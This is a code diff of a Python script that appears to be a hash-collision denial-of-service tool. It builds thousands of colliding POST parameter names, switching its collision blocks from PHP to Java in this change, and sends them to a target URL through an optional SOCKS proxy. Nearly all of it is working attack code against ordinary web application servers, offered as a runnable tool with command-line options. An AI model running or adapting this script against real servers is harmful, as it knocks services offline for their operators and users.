@@ -16,7 +16,11 @@ parametri | tempo (s)
 ref: http://permalink.gmane.org/gmane.comp.security.full-disclosure/83694
 """
 import os
+import optparse
+import random
 import socket
+import sys
+import urllib
 
 def provide_socket():
     proxy = os.getenv("socks_proxy", '')
@@ -34,32 +38,25 @@ def random_permutations(collisions, n, random):
         yield [random.choice(collisions) for i in range(n)]
 
 def generate_random_parameters(collisions, nparams, lparams):
-    from random import Random
-    generator = random_permutations(collisions, lparams, Random()) 
+    generator = random_permutations(collisions, lparams, random.Random()) 
     keys = [ "".join(generator.next()) for i in range(nparams)]
     values = range(nparams)
     return dict(zip(keys, values))
 
 def post(url, parameters):
-    from urllib import urlopen, urlencode
     socket.socket = provide_socket()
-    urlencoded_parameters = urlencode(parameters)
-    opened_url = urlopen(url, urlencoded_parameters)
+    urlencoded_parameters =  urllib.urlencode(parameters)
+    opened_url = urllib.urlopen(url, urlencoded_parameters)
     return opened_url.read()
 
 if __name__ == "__main__":
-    from sys import exit
-    from optparse import OptionParser
-
-    parser = OptionParser(version="1.0beta")
+    parser = optparse.OptionParser(version="1.0beta")
     parser.add_option("-v", dest="verbose", action="store_true", )
     parser.add_option("-n", dest="nparams", default=10000, type=int)
     parser.add_option("-l", dest="lparams", default=20, type=int)
     parser.add_option("-d", dest="dump", action="store_true", help="only output generated parameters")
     (options, args) = parser.parse_args()
-    # PHP: 
-    collisions = ['xz', 'yY', 'z8']
-    # JAVA: collisions = [ "gq", "hR", "i3" ]
+    collisions = [ "gq", "hR", "i3" ]
     parameters = generate_random_parameters(collisions, options.nparams, options.lparams)
 
     if options.verbose:
@@ -71,7 +68,7 @@ if __name__ == "__main__":
     if options.dump:
         for x in parameters.keys(): 
             print(x)
-        exit(0)
+        sys.exit(0)
 
     if len(args) != 1:
         parser.error("missing target url")
